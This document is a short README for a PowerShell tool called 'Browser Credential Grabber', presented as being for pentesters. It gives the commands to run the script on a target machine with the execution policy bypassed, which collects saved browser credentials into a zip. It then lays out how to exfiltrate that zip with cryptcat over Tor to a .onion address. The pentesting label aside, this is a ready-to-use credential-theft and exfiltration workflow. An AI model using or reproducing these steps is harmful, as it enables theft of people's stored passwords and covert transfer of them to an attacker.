# Browser Credential Grabber
This script can be utilized by pentesters to collect saved credentials data in browsers from the target machine. 

## Usage 
- Run the scipt in the target machine 
CMD : 
```
powershell -ExecutionPolicy Bypass -File grab.ps1
```
PowerShell :
```
.\grab.ps1
```
This will grab the credentials as a zip into the temp folder
- To exfiltrate the zip, use cryptcat and a tor server 
In the Attacker machine :
```
torify cryptcat -l -p 4444 > data.zip
```
In the Target machine :
```
cryptcat qd4axpacwmfx7zg7abdssxrhmikrg66gsgamxd6vr4ms65bdfmdzvjqq2yd.onion 4444 < $env:USERPROFILE\TEMP\data.zip
```
